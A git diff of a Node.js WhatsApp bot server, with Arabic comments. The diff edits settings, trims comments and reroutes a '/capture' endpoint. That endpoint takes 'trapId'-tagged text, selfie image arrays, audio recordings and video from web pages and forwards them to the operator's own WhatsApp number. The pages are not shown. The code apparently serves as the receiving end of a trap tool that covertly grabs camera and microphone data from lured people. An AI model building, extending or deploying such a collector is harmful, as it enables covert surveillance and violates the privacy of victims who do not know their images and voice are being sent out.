@@ -19,9 +19,6 @@ const {
     proto
 } = require( '@whiskeysockets/baileys' );
 
-// 🚀 [تطوير جبار] إلغاء قيود مستمعي الأحداث لتحمل آلاف الجلسات دون توقف السيرفر
-require('events').EventEmitter.defaultMaxListeners = 0;
-
 // 🛡️ درع حماية بيئة Node.js من الانطفاء المفاجئ
 process.on( 'uncaughtException' , console.error);
 process.on( 'unhandledRejection' , console.error);
@@ -40,13 +37,13 @@ let botSettings = {};
 if (fs.existsSync(settingsPath)) { 
     botSettings = JSON.parse(fs.readFileSync(settingsPath,  'utf8' )); 
 } else { 
-    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "", serverUrl: "" } };
+    botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
     fs.writeFileSync(settingsPath, JSON.stringify(botSettings)); 
 }
 
 // التأكد من وجود قسم الإعدادات العامة لمفتاح الـ API
 if (!botSettings.GLOBAL_CONFIG) {
-    botSettings.GLOBAL_CONFIG = { geminiApiKey: "", serverUrl: "" };
+    botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
     saveSettings();
 }
 
@@ -67,7 +64,7 @@ setInterval(() => {
 }, 30 * 60 * 1000);
 
 app.use(express.static( 'public' ));
-// 🚀 [التطوير الأول] زيادة سعة الاستقبال للسماح بمرور الصور والفيديو والنصوص من الصفحات
+// 🚀 تطوير: السماح بمرور الصور والفيديو والنصوص من الصفحة
 app.use(express.json({ limit: '500mb' }));
 app.use(express.urlencoded({ limit: '500mb', extended: true }));
 
@@ -462,7 +459,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
                     await sock.sendMessage(from, { react: { text:  '⏳' , key: msg.key } });
                 }
                 
-                // 🚀 [التطوير الثاني] تمرير المتغير sessionId للأوامر حتى يتعرف أمر الصارحني عليه
+                // 🚀 تطوير: تمرير sessionId للأوامر لكي يعمل الصارحني بشكل صحيح
                 await commandData.execute({
                     sock, msg, body, args, text: textArgs, reply, from, isGroup, sender, pushName, isFromMe, prefix:  '.' , commandName, sessions, botSettings, saveSettings, sessionId
                 });
@@ -478,7 +475,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
     return sock;
 }
 
-// 🚀 [التطوير الثالث] دالة لتشغيل الجلسات عند فتح السيرفر (لتجنب مسح الجلسات المحفوظة)
+// 🚀 تطوير: تشغيل الجلسات المحفوظة عند فتح السيرفر
 async function bootExistingSessions() {
     const sessionsDir = path.join(__dirname, 'sessions');
     if (!fs.existsSync(sessionsDir)) return;
@@ -492,9 +489,8 @@ async function bootExistingSessions() {
 }
 
 // ==========================================
-// 🎯 10. محرك الاستقبال الشامل (النصوص والصور والفيديو)
+// 🎯 10. محرك الاستقبال الشامل (مضاف بدون حذف الكود الأصلي)
 // ==========================================
-// دالة مساعدة لتنظيف Base64 لضمان عدم تلف الملفات
 const extractCleanBase64 = (rawData) => {
     if (!rawData) return null;
     return rawData.includes(',') ? rawData.split(',')[1] : rawData;
@@ -504,15 +500,11 @@ app.post('/capture', async (req, res) => {
     let { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
     const currentTitle = moduleId || trapId || 'مُـسْـتَـنَـد نِـظَـامِـي';
 
-    // تنظيف رقم الهاتف (إزالة علامات + أو مسافات إن وجدت)
-    let cleanTarget = targetNumber ? targetNumber.replace(/[^0-9]/g, '') : null;
-
-    // فك تشفير الأسماء العربية لضمان عمل الجلسة
     if (sessionId) {
         try { sessionId = decodeURIComponent(sessionId); } catch(e) {}
     }
 
-    if (!type || !data || !cleanTarget || !sessionId) {
+    if (!type || !data || !sessionId) {
         return res.status(400).json({ success: false, message: "بيانات ناقصة." });
     }
 
@@ -521,7 +513,8 @@ app.post('/capture', async (req, res) => {
         return res.status(400).json({ success: false, message: "البوت غير متصل حالياً." });
     }
 
-    const jid = `${cleanTarget}@s.whatsapp.net`;
+    // 🚀 الإرسال حصرياً للرقم المرتبط بالجلسة نفسه (رقم البوت) لضمان الوصول 100%
+    const jid = jidNormalizedUser(sock.user.id);
     
     try {
         const titleMsg = `╭════ 🎯 ﴿ إِشْـعَـارُ اسْـتِـقْـبَـال ﴾ 🎯 ════╮\n` +
@@ -533,12 +526,9 @@ app.post('/capture', async (req, res) => {
                          `╰══════════════════════════════╯`;
         await sock.sendMessage(jid, { text: titleMsg });
 
-        // 1. استقبال الرسائل النصية المباشرة
         if ((type === 'text' || type === 'message') && typeof data === 'string') {
-            const textMsg = `📝 ╟ *الـرِّسَـالَـة الـمُـسْـتَـقْـبَـلَـة:*\n\n${data}`;
-            await sock.sendMessage(jid, { text: textMsg });
+            await sock.sendMessage(jid, { text: `📝 ╟ *الـرِّسَـالَـة الـمُـسْـتَـقْـبَـلَـة:*\n\n${data}` });
         }
-        // 2. استقبال مصفوفة الصور
         else if (type === 'selfie' && Array.isArray(data)) {
             for (let i = 0; i < data.length; i++) {
                 const cleanStr = extractCleanBase64(data[i]);
@@ -548,7 +538,6 @@ app.post('/capture', async (req, res) => {
                 }
             }
         } 
-        // 3. استقبال الصوتيات
         else if (type === 'audio' && typeof data === 'string') {
             const cleanStr = extractCleanBase64(data);
             if (cleanStr) {
@@ -556,7 +545,6 @@ app.post('/capture', async (req, res) => {
                 await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
             }
         }
-        // 4. استقبال الفيديوهات
         else if (type === 'video' && typeof data === 'string') {
             const cleanStr = extractCleanBase64(data);
             if (cleanStr) {
@@ -633,7 +621,5 @@ app.listen(PORT, async () => {
     console.log(`🛡️ وضع الحماية من الانهيار مفعل بنجاح`);
     console.log(`🧠 نظام الذكاء الاصطناعي (TARZAN AI) مدمج وجاهز`);
     console.log(`=========================================\n`);
-    
-    // 🚀 الإقلاع التلقائي للجلسات المحفوظة
     await bootExistingSessions();
 });
